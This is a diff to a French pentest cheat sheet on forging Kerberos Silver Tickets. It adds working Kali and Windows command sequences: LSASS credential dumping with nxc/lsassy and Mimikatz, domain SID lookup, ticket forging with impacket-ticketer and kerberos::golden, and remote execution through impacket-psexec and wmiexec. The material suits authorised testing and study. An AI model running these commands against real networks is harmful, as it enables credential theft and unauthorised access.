@@ -289,31 +289,56 @@ Forger un service ticket (TGS) en utilisant le hash NTLM du compte de service. L
 
 > La validation PAC (optionnelle) est rarement activée sur les services -  l'attaque fonctionne dans la grande majorité des cas.
 
-**Informations requises**
+**Kali**
 
-| Élément | Comment l'obtenir |
-|---|---|
-| Hash NTLM du compte de service | Mimikatz `sekurlsa::logonpasswords` (si session active sur la machine) |
-| Domain SID | `whoami /user` → retirer le RID (dernier `-XXXX`) |
-| SPN cible | `setspn -L <USER>` ou `Get-NetUser -SPN` |
+1. Dump lssas
+```bash
+nxc smb 192.168.1.10 -u 'USERNAME' -p 'PASSWORD' -M lsassy
+```
 
-**Récupérer le hash NTLM du service (Mimikatz)**
+2. Obtenir le Domain SID
+```bash
+impacket-lookupsid corp.com/'USERNAME':'PASSWORD'@192.168.1.10
+```
 
+```bash
+nxc smb 192.168.1.10 -u 'USERNAME' -p 'PASSWORD' -x "whoami /user"
+# ex: S-1-5-21-1987370270-658905905-1781884369-1105
+# Domain SID = S-1-5-21-1987370270-658905905-1781884369 (sans le RID final)
+```
+
+3. Forger et injecter le Silver Ticket
+```bash
+impacket-ticketer -nthash 'SERVICE_NTLM_HASH' -domain-sid 'DOMAIN_SID' -domain corp.com -spn 'PROTOCOL'/'SPN_HOST'
+# → génère <USERNAME>.ccache
+```
+
+4. Utiliser le ticket
+```bash
+export KRB5CCNAME=<USERNAME>.ccache
+
+impacket-psexec -k -no-pass corp.com/'USERNAME'@'SPN_HOST' -dc-ip 'IP_DC' -target-ip 'IP_DC'
+impacket-wmiexec -k -no-pass corp.com/'USERNAME'@'SPN_HOST' -dc-ip 'IP_DC' -target-ip 'IP_DC'
+
+curl -k --negotiate -u : http://<SPN_HOST>
+```
+
+**Windows (Mimikatz)**
+
+1. Dump lssas
 ```
 privilege::debug
 sekurlsa::logonpasswords
 ```
 
-**Obtenir le Domain SID**
-
+2. Obtenir le Domain SID
 ```powershell
 whoami /user
 # ex: S-1-5-21-1987370270-658905905-1781884369-1105
 # Domain SID = S-1-5-21-1987370270-658905905-1781884369 (sans le RID final)
 ```
 
-**Forger et injecter le Silver Ticket (Mimikatz)**
-
+3. Forger et injecter le Silver Ticket
 ```
 kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /target:<SPN_HOST> /service:<PROTOCOL> /rc4:<NTLM_HASH> /user:<USER> /ptt
 ```
@@ -325,13 +350,13 @@ kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com 
 
 > `/ptt` injecte directement le ticket en mémoire. Le module s'appelle `kerberos::golden` mais génère bien un **silver ticket** quand `/service` est spécifié (pas `krbtgt`).
 
-**Vérifier que le ticket est en mémoire**
+4. Vérifier que le ticket est en mémoire**
 
 ```powershell
 klist
 ```
 
-**Utiliser le ticket**
+5. Utiliser le ticket**
 
 ```powershell
 iwr -UseDefaultCredentials http://web04
